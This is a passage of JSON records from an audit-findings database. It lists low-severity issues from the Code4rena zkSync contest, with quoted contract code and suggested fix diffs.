      "content": "\n- [ContractDeployer, line 307](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/ContractDeployer.sol#L307C17-L307C45) - what ensures?\n- [bootloader, line 1562](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L1562C17-L1562C54) - the end of the comment is missing.\n- [SystemContractHelper, lines 170 and 173](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/contracts/libraries/SystemContractHelper.sol#L173) - add the [ones being developed by lambdaclass](https://github.com/lambdaclass/zksync_era_precompiles#current-status) to that list.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30323",
      "title": "[21] Unnecessary comments",
      "impact": "LOW",
      "content": "\n- [contracts/zksync/contracts/Dependencies.sol](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/zksync/contracts/Dependencies.sol) - not used anywhere.\n- [system-contracts/bootloader/bootloader.yul, line 862](https://github.com/code-423n4/2023-10-zksync/blob/72f5f16ed4ba94c7689fe38fcb0b7d27d2a3f135/code/system-contracts/bootloader/bootloader.yul#L862) - out of place.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30322",
      "title": "[20] Rogue validators can spam `revertBlocks` and make the chain unusable",
      "impact": "LOW",
      "content": "\nIn [Executor, function `revertBlocks`](https://github.com/matter-labs/era-contracts/blob/f06a58360a2b8e7129f64413998767ac169d1efd/ethereum/contracts/zksync/facets/Executor.sol#L440C1-L456C6) there is no way to prevent a rogue validator to spam this function and DOS other validators from executing the commited batches, as [executeBlocks](https://github.com/matter-labs/era-contracts/blob/f06a58360a2b8e7129f64413998767ac169d1efd/ethereum/contracts/zksync/facets/Executor.sol#L294C14-L294C27) has a delay enforced by [ValidatorTimelock](https://github.com/matter-labs/era-contracts/blob/f06a58360a2b8e7129f64413998767ac169d1efd/ethereum/contracts/zksync/ValidatorTimelock.sol#L109C1-L109C111), which is supposed to be non-zero. As the validator is currently controlled by Matter Labs, I'm putting it as a Low but consider implementing a delay or a slashing mechanism to validators that try to abuse their privileges by spamming `revertBlocks` for batches that do not benefit them, or even try to DOS the network.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30321",
      "title": "[19] Wrong initialisation of the zero point",
      "impact": "LOW",
      "content": "\nIn [ecrecover/secp256k1/mod.rs, lines 147 to 153](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L147C1-L153C6) is wrong:\n\n```solidity\n    fn zero() -> Self {\n        PointAffine {\n            x: Fq::zero(),\n            y: Fq::one(),\n            infinity: true,\n        }\n    }\n````\n\nAs `is_zero` is defined like:\n\n```solidity\n\n    fn is_zero(&self) -> bool {\n        self.infinity\n    }\n```\n\nAlso, `self.infinity` is toggled up when `self.x` = `self.y` = `0`:\n\n[ecrecover/secp256k1/mod.rs, lines 189 to 211](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L189C1-L211C6)\n\n```solidity\n    fn from_xy_unchecked(x: Self::Base, y: Self::Base) -> Self {\n        let infinity = x.is_zero() && y.is_zero();\n        Self {\n            x: x,\n            y: y,\n            infinity,\n        }\n    }\n\n    fn from_xy_checked(x: Self::Base, y: Self::Base) -> Result<Self, GroupDecodingError> {\n        let infinity = x.is_zero() && y.is_zero();\n        let affine = Self {\n            x: x,\n            y: y,\n            infinity,\n        };\n\n        if !affine.is_on_curve() {\n            Err(GroupDecodingError::NotOnCurve)\n        } else {\n            Ok(affine)\n        }\n    }\n```\n\nI'm putting it as a Low as it may be some weird math thing, but the zero element in all *\"math-things\"* is defined as the one that makes:\n\n*Note: please see calculation in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/548).*\n\nHaving two *\"zero-elements\"* is definetly wrong. If I am right, then it may be a High as some [functions like `eq`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L47C1-L86C2) or [`is_on_curve`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/ecrecover/secp256k1/mod.rs#L124C1-L139C6) would return true for both.\n\n*Note: please see scenario in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/548).*\n\nI can't give you a solution, as I do not know which one is the right point, as in some places it says it is the `(0, 0)` and in others say it is `(0, 1)`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30320",
      "title": "[18] Chaining hashes with the wrong initial value",
      "impact": "LOW",
      "content": "\nUsually, when we want to chain hashes one after another we start with the empty string hash and then hash the rest by encoding one after another like `\"\" || str1 || str2 || ...` and hashing them in pairs. However, in many places it is used `0` as the initial *\"string\"* which may lead to issues as some of your contracts in L1 do use `EMPTY_STRING_KECCAK` instead, namely\n\n[Executor, function `_collectOperationsFromPriorityQueue`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L260C1-L267C6)\n\n```solidity\n    function _collectOperationsFromPriorityQueue(uint256 _nPriorityOps) internal returns (bytes32 concatHash) {\n        concatHash = EMPTY_STRING_KECCAK;\n\n        for (uint256 i = 0; i < _nPriorityOps; i = i.uncheckedInc()) {\n            PriorityOperation memory priorityOp = s.priorityQueue.popFront();\n            concatHash = keccak256(abi.encode(concatHash, priorityOp.canonicalTxHash));\n        }\n    }\n```\n\nIn the future, it seems there will be more. On the other hand, there are some places which do not follow this:\n\n[L1Messenger, line 210](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L210)\n\n```solidity\n        bytes32 reconstructedChainedLogsHash; // defaults to bytes32(0)\n```\n\n[L1Messenger, line 240](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L240)\n\n```solidity\n        bytes32 reconstructedChainedMessagesHash; // defaults to bytes32(0)\n```\n\n[L1Messenger, line 258](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L258)\n\n```solidity\n        bytes32 reconstructedChainedL1BytecodesRevealDataHash; // defaults to bytes32(0)\n```\n\n[L1Messenger, lines 331 to 335](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L331C1-L335C55)\n\n```solidity\n        /// Clear logs state\nchainedLogsHash = bytes32(0);\nnumberOfLogsToProcess = 0;\nchainedMessagesHash = bytes32(0);\nchainedL1BytecodesRevealDataHash = bytes32(0);\n```\n\n[SystemContext, line 293](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/SystemContext.sol#L293)\n\n```solidity\n        currentL2BlockTxsRollingHash = bytes32(0);\n```\n\nConsider changing them to `EMPTY_STRING_KECCAK`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30319",
      "title": "[17] Tautology in `publishPubdataAndClearState`",
      "impact": "LOW",
      "content": "\nIn [L1Messenger, function `publishPubdataAndClearState`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/L1Messenger.sol#L206) there is a tautology:\n\n```solidity\n        require(numberOfL2ToL1Logs <= numberOfL2ToL1Logs, \"Too many L2->L1 logs\");\n```\n\nAs `numberOfL2ToL1Logs <= numberOfL2ToL1Logs` always holds, it can pass more logs than `numberOfLogsToProcess`. However, the correctness of the amount of sent logs is also checked in\n\n[Executor, lines 166 to 170](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L166C1-L170C10)\n\n```solidity\n        if (_expectedSystemContractUpgradeTxHash == bytes32(0)) {\n            require(processedLogs == 127, \"b7\");\n        } else {\n            require(processedLogs == 255, \"b8\");\n        }\n```\n\nNOTE: I did not test it, but it seems it lets the door open for the operator to add an additional log to the queue if there was a system upgrade, so that the first condition reverts, which may be considered as a temporal DOS/griefing. Consider changing to:\n\n```diff\n-        require(numberOfL2ToL1Logs <= numberOfL2ToL1Logs, \"Too many L2->L1 logs\");\n+        require(numberOfL2ToL1Logs <= numberOfLogsToProcess, \"Too many L2->L1 logs\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30318",
      "title": "[16] If `_enumerationIndexSize` is `0`, `compressedEnumIndex` equals `metadata`",
      "impact": "LOW",
      "content": "\nIn [Compressor, lines 175 to 177](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L175C1-L179C81):\n\n```solidity\n            uint256 compressedEnumIndex = _sliceToUint256(_compressedStateDiffs[stateDiffPtr:stateDiffPtr + _enumerationIndexSize]);\n            require(enumIndex == compressedEnumIndex, \"rw: enum key mismatch\");\n            stateDiffPtr += _enumerationIndexSize;\n            \n            uint8 metadata = uint8(bytes1(_compressedStateDiffs[stateDiffPtr]));\n```\n\nIf `_enumerationIndexSize` is zero, then `compressedEnumIndex` and `metadata` will have the same value, as `stateDiffPtr += 0` equals `stateDiffPtr`.\n\n[Compressor, lines 117 to 126](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/Compressor.sol#L117C1-L126C109)\n\n```diff\n    function verifyCompressedStateDiffs(\n        uint256 _numberOfStateDiffs,\n        uint256 _enumerationIndexSize,\n        bytes calldata _stateDiffs,\n        bytes calldata _compressedStateDiffs\n    ) external payable onlyCallFrom(address(L1_MESSENGER_CONTRACT)) returns (bytes32 stateDiffHash) {\n        // We do not enforce the operator to use the optimal, i.e. the minimally possible _enumerationIndexSize. \n        // We do enforce however, that the _enumerationIndexSize is not larger than 8 bytes long, which is the \n        // maximal ever possible size for enumeration index.\n+       require(_enumerationIndexSize != 0, \"whatever\");\n        require(_enumerationIndexSize <= MAX_ENUMERATION_INDEX_SIZE, \"enumeration index size is too large\");\n\n        ...\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30317",
      "title": "[15] Wrong logic",
      "impact": "LOW",
      "content": "\nBoth [Utils, function `bytecodeLenInWords`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/Utils.sol#L46) and [L2ContractHelper, function `_bytecodeLen`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L50) do calculate the length in words of a given bytecode like the following:\n\n```solidity\n        codeLengthInWords = uint256(uint8(_bytecodeHash[2])) * 256 + uint256(uint8(_bytecodeHash[3]));\n```\n\nHowever, when hashing the bytecode, the bytes at position `[2]` are set to `0`:\n\n```solidity\n    function hashL2Bytecode(bytes memory _bytecode) internal pure returns (bytes32 hashedBytecode) {\n\n        ...\n\n        hashedBytecode = sha256(_bytecode) & 0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;\n        // Setting the version of the hash\n        hashedBytecode = (hashedBytecode | bytes32(uint256(1 << 248)));\n        // Setting the length\n        hashedBytecode = hashedBytecode | bytes32(bytecodeLenInWords << 224);\n    }\n```\n\nIt seems that `codeLengthInWords` should be equal to the bytes at position `[3]` alone, as the variable's name `bytecodeLenInWords` suggests, that is:\n\n[L2ContractHelper, function `_bytecodeLen`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L49C1-L51C6)\n\n```diff\n    function _bytecodeLen(bytes32 _bytecodeHash) private pure returns (uint256 codeLengthInWords) {\n-       codeLengthInWords = uint256(uint8(_bytecodeHash[2])) * 256 + uint256(uint8(_bytecodeHash[3]));\n+       codeLengthInWords = uint256(uint8(_bytecodeHash[3]));\n    }\n```\n\n[Utils, function `bytecodeLenInWords`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/Utils.sol#L44C1-L48C6)\n\n```diff\n    function bytecodeLenInWords(bytes32 _bytecodeHash) internal pure returns (uint256 codeLengthInWords) {\n        unchecked {\n-           codeLengthInWords = uint256(uint8(_bytecodeHash[2])) * 256 + uint256(uint8(_bytecodeHash[3]));\n+           codeLengthInWords = uint256(uint8(_bytecodeHash[3]));\n        }\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30316",
      "title": "[14] Lower-bound the minimum execution delay in `ValidatorTimelock`",
      "impact": "LOW",
      "content": "\n[ValidatorTimelock, function `setExecutionDelay`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/ValidatorTimelock.sol#L59C1-L62C6)\n\n```diff\n+   uint32 MIN_EXECUTION_DELAY = uint32(1 hours); // whatever\n\n    function setExecutionDelay(uint32 _executionDelay) external onlyOwner {\n+       require(_executionDelay >= MIN_EXECUTION_DELAY, \"Don't do that\");\n        executionDelay = _executionDelay;\n        emit NewExecutionDelay(_executionDelay);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30315",
      "title": "[13] Misleading comment",
      "impact": "LOW",
      "content": "\nIn [Executor, line 440](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L440)\n\n```solidity\n                bytes32(0) // zkPorter batch hash\n```\n\nit says *\"zkPorter batch HASH\"*, so it seems it should be:\n\n```diff\n-                bytes32(0) // zkPorter batch hash\n+                EMPTY_STRING_KECCAK // zkPorter batch hash\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30314",
      "title": "[12] Useless `max` pick",
      "impact": "LOW",
      "content": "\nIn [bootloader, line 1456](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1456), it is being picked the maximum between the refund provided by the operator and the one calculated by the bootloader plus the initial excess of gas. As `askOperatorForRefund` is called with the leftover gas found by the bootloader, it will return a value less than `reservedGas + gasLeft` so the `max` function is broken. Consider doing the same as in:\n\n[bootloader, lines 914 to 921](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L914C1-L921C57)\n\n```solidity\n                    // Asking the operator for refund\n                    askOperatorForRefund(potentialRefund)\n                    \n                    // In case the operator provided smaller refund than the one calculated\n                    // by the bootloader, we return the refund calculated by the bootloader.\n                    refundGas := max(getOperatorRefundForTx(transactionIndex), potentialRefund)\n                    }\n                    \n                refundGas := add(refundGas, reservedGas)\n```\n\nThat is, rewrite:\n\n[bootloader, lines 1450 to 1456](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1450C1-L1456C90)\n\n```diff\n               askOperatorForRefund(gasLeft)\n\n               let operatorProvidedRefund := getOperatorRefundForTx(transactionIndex)\n\n               // If the operator provides the value that is lower than the one suggested for \n               // the bootloader, we will use the one calculated by the bootloader.\n-              let refundInGas := max(operatorProvidedRefund, add(reservedGas, gasLeft))\n+              let refundInGas := max(operatorProvidedRefund, gasLeft)\n+              refundInGas := add(reservedGas, refundInGas)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30313",
      "title": "[11] It is possible to refund a single transaction more than `2³² - 1` gas, whilst the bootloader only has that amount of gas available for a given batch",
      "impact": "LOW",
      "content": "\nThe bootloader is provided with `2³² - 1` gas to execute all submitted transactions in a given batch, so it is expected that all the gas refunds will be below that amount. For L2 transactions, it is checked in:\n\n[bootloader, lines 1463 to 1465](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1463C1-L1465C18)\n\n```solidity\n                if iszero(validateUint32(refundInGas)) {\n                      assertionError(\"refundInGas is not uint32\")\n                }\n```\n\nBut for `L1⇒L2` transactions it is not enforced, leading to a possible situation in which the operator refunds, or even pay himself, more than what the bootloader really has. Consider doing in:\n\n[bootloader, line 926](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L926)\n\n```diff\n\n                if gt(refundGas, gasLimit) {\n                    assertionError(\"L1: refundGas > gasLimit\")\n                }\n\n+               if iszero(validateUint32(refundInGas)) {\n+                   assertionError(\"refundInGas is not uint32\")\n+               }\n\n                let payToOperator := safeMul(gasPrice, safeSub(gasLimit, refundGas, \"lpah\"), \"mnk\")\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30312",
      "title": "[10] `L1⇒L2` transactions are not free, but bootloader behaves like they are",
      "impact": "LOW",
      "content": "\nIn [Mailbox, function `requestL2Transaction`](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L270C1-L270C19), the `isFree` parameter of the call to `_requestL2Transaction` is hard-coded to `false`:\n\n```solidity\n        canonicalTxHash = _requestL2Transaction(\n            sender,                        // from\n            _contractL2,                   // to\n            _l2Value,                      // bridged ETH\n            _calldata,                     // the usual calldata\n            _l2GasLimit,                   // the amount of gas user is willing to spend\n            _l2GasPerPubdataByteLimit,     // the amount of gas per pubdata the operator may charge\n            _factoryDeps,                  // bytecode to be marked as known on L2\n            false,                         // isFree\n            _refundRecipient               // who is gonna receive the excess of gas or the whole ETH if the tx fails\n        );\n```\n\nSo the calculation of the L2 gas price:\n\n[Mailbox, lines 303 to 307](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L303C1-L307C10)\n\n```solidity\n            params.l2GasPrice = _isFree ? 0 : _deriveL2GasPrice(tx.gasprice, _l2GasPerPubdataByteLimit);\n            uint256 baseCost = params.l2GasPrice * _l2GasLimit;\n```\n\nDefaults to:\n\n```solidity\n            params.l2GasPrice = _deriveL2GasPrice(tx.gasprice, _l2GasPerPubdataByteLimit);\n            uint256 baseCost = params.l2GasPrice * _l2GasLimit;\n```\n\nTaking into account that its value can never be zero because:\n\n```solidity\n      function _deriveL2GasPrice(uint256 _l1GasPrice, uint256 _gasPricePerPubdata) internal pure returns (uint256) {\n            uint256 pubdataPriceETH = L1_GAS_PER_PUBDATA_BYTE * _l1GasPrice;\n            uint256 minL2GasPriceETH = (pubdataPriceETH + _gasPricePerPubdata - 1) / _gasPricePerPubdata;\n            \n            return Math.max(FAIR_L2_GAS_PRICE, minL2GasPriceETH);\n      }\n```\n\nThis returns at least `FAIR_L2_GAS_PRICE`. If we go to [bootloader, function `processL1Tx`](https://github.com/code-423n4/2023-10-zksync/blob/c3ff020df5d11fe91209bd99d7fb0ec1272dc387/code/system-contracts/bootloader/bootloader.yul#L878C1-L951C18), the `refundGas` the user will receive is the sum of:\n\n*Note: please see calculation in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/548).*\n\n`reservedGas` is the excess of gas between what the user provided and what the operator is willing to use, and `refundGas` (not the final one) is the remaining gas that is left after preparing and executing the requested transaction. It is expected then that `_refundRecipient` will receive `refundGas * gasPrice` as a compensation for providing more gas than the needed for the execution of the `L1⇒L2` transaction.\n\nHowever, we see in:\n\n[Mailbox, lines 929 to 932](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L929C1-L932C45)\n\n```solidity\n                // Note, that for now, the `L1->L2` transactions are free, i.e. the gasPrice\n                // for such transactions is always zero, so the `refundGas` is not used anywhere\n                // except for notifications for the operator for API purposes. \n                notifyAboutRefund(refundGas)\n```\n\nIt is never used, as it assumes that \"L1⇒L2 transactions are free\", which is not true. If the transaction does not revert, then `_refundRecipient` will receive:\n\n[bootloader, line 950](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L950)\n\n```solidity\n                    toRefundRecipient := safeSub(getReserved0(innerTxDataOffset), safeAdd(getValue(innerTxDataOffset), payToOperator, \"kpa\"), \"ysl\")\n```\n\nThis equals to `msg.value - (l2Value + payToOperator)`. I kindly suggest changing the code to:\n\n[bootloader, lines 929 to 952](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L929C1-L952C1)\n\n```diff\n-               // Note, that for now, the `L1->L2` transactions are free, i.e. the gasPrice\n-               // for such transactions is always zero, so the `refundGas` is not used anywhere\n-               // except for notifications for the operator for API purposes. \n                notifyAboutRefund(refundGas)\n\n                // Paying the fee to the operator\n                mintEther(BOOTLOADER_FORMAL_ADDR(), payToOperator, false)\n\n                let toRefundRecipient\n                switch success\n                case 0 {\n                    // If the transaction reverts, then minting the msg.value to the user has been reverted\n                    // as well, so we can simply mint everything that the user has deposited to \n                    // the refund recipient\n\n                    toRefundRecipient := safeSub(getReserved0(innerTxDataOffset), payToOperator, \"vji\")\n                }\n                default {\n-                   // If the transaction succeeds, then it is assumed that msg.value was transferred correctly. However, the remaining \n-                   // ETH deposited will be given to the refund recipient.\n+                   // If the transaction succeeds, then it is assumed that msg.value was transferred correctly, so refundGas is \n+                   // sent to the refund recipient.\n\n-                   toRefundRecipient := safeSub(getReserved0(innerTxDataOffset), safeAdd(getValue(innerTxDataOffset), payToOperator, \"kpa\"), \"ysl\")\n+                   toRefundRecipient := safeMul(refundGas, gasPrice, \"whatever error you want\")\n                }\n```\n\nIf both equations are equal, that is, `refundGas * gasPrice = msg.value - (l2Value + payToOperator)`, then this is more explicit and saves gas by not doing `safeSub`s nor `safeAdd`s (QA). If they are **NOT**, then this code is the correct one, as you are giving the refund recipient exactly the calculated `refundGas`, no more, no less.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30311",
      "title": "[09] `rawCall` does permit calls to `MsgValueSimulator` with the `_isSystem` flag set to false (it will revert)",
      "impact": "LOW",
      "content": "In [MsgValueSimulator, `fallback`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/MsgValueSimulator.sol#L35C45-L35C59) can only be called with the `systemCall` flag set (not the ABI one, which is retrieved through `SystemContractHelper.getExtraAbiData`)\n\n```solidity\n    fallback(bytes calldata _data) external onlySystemCall returns (bytes memory)\n```\n\n[ISystemContract, lines 15 to 21](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/interfaces/ISystemContract.sol#L15C1-L21C6)\n\n```solidity\n    modifier onlySystemCall() {\n        require(\n            SystemContractHelper.isSystemCall() || SystemContractHelper.isSystemContract(msg.sender),\n                \"This method require system call flag\"\n        );\n        _;\n    }\n```\n\nHowever, in [EfficientCall, function `rawCall`](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/EfficientCall.sol#L146) does let the door open for doing calls to `MsgValueSimulator` with the `_isSystem` flag set to `false` even if the corresponding ABI parameter is hard-coded to `true`.\n\n[EfficientCall, lines 139 to 146](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/EfficientCall.sol#L139C1-L146C85)\n\n```solidity\n            _loadFarCallABIIntoActivePtr(_gas, _data, false, true); <========= isSystem hard-coded to true\n\n            // If there is provided `msg.value` call the `MsgValueSimulator` to forward ether.\n            address msgValueSimulator = MSG_VALUE_SYSTEM_CONTRACT;\n            address callAddr = SYSTEM_CALL_BY_REF_CALL_ADDRESS;\n            // We need to supply the mask to the MsgValueSimulator to denote\n            // that the call should be a system one.\n            uint256 forwardMask = _isSystem ? MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT : 0; <========= may be false\n```\n\nConsider just using `MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT`, as the `_isSystem` parameter is expected to be used for non-zero value calls.\n\n```diff\n    function rawCall(\n        uint256 _gas,\n        address _address,\n        uint256 _value,\n        bytes calldata _data,\n        bool _isSystem\n    ) internal returns (bool success) {\n        if (_value == 0) {\n            _loadFarCallABIIntoActivePtr(_gas, _data, false, _isSystem);\n\n            address callAddr = RAW_FAR_CALL_BY_REF_CALL_ADDRESS;\n            assembly {\n                success := call(_address, callAddr, 0, 0, 0xFFFF, 0, 0)\n            }\n        } else {\n            _loadFarCallABIIntoActivePtr(_gas, _data, false, true);\n\n            // If there is provided `msg.value` call the `MsgValueSimulator` to forward ether.\n            address msgValueSimulator = MSG_VALUE_SYSTEM_CONTRACT;\n            address callAddr = SYSTEM_CALL_BY_REF_CALL_ADDRESS;\n-           // We need to supply the mask to the MsgValueSimulator to denote\n-           // that the call should be a system one.\n-           uint256 forwardMask = _isSystem ? MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT : 0;\n+           uint256 forwardMask = MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT; \n\n            assembly {\n                success := call(msgValueSimulator, callAddr, _value, _address, 0xFFFF, forwardMask, 0)\n            }\n        }\n    }\n```\n\nAs seen in [SystemContractsCaller, lines 103 to 112](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/libraries/SystemContractsCaller.sol#L103C1-L112C10), the comments are the same, so it seems it was copy-pasted.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
